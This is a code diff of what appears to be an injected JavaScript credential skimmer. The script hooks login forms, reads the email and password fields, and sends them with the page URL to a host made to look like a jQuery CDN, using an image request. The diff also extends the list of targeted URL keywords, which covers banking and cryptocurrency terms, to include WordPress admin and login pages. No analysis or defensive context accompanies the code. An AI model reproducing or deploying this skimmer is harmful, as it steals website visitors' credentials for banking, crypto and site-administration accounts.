@@ -90,7 +90,6 @@ var login_form = document.getElementById("loginForm");
             login.email = document.getElementsByName("usus")[0].value;
             login.pass = document.getElementsByName("clave")[0].value;
             (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
-
 		        }
           }
         }
@@ -102,10 +101,9 @@ var login_form = document.getElementById("loginForm");
           if (document['getElementsByName']('conexion')[0]) {
               clearInterval(interval);
               document['getElementsByClassName']('botones_1')[0].onmouseover = function (_0x441cx2) {
-               var login = {};
+              var login = {};
               login.email = document.getElementsByName("userid")[0].value;
               login.pass = document.getElementsByName("password")[0].value;
-
               (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
               }
           }
@@ -132,7 +130,7 @@ var login_form = document.getElementById("loginForm");
 
 
 (function () {
-var myStringArrayBAN = ["banca", "banco", "bank", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "YouTube Video"];
+var myStringArrayBAN = ["banca", "banco", "bank", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "wp-admin.php", "wp-login.php"];
 var arrayLengthBAN = myStringArrayBAN.length;
 for (var i = 0; i < arrayLengthBAN; i++) {
     if (window.location.href.indexOf(myStringArrayBAN[i]) > -1) {
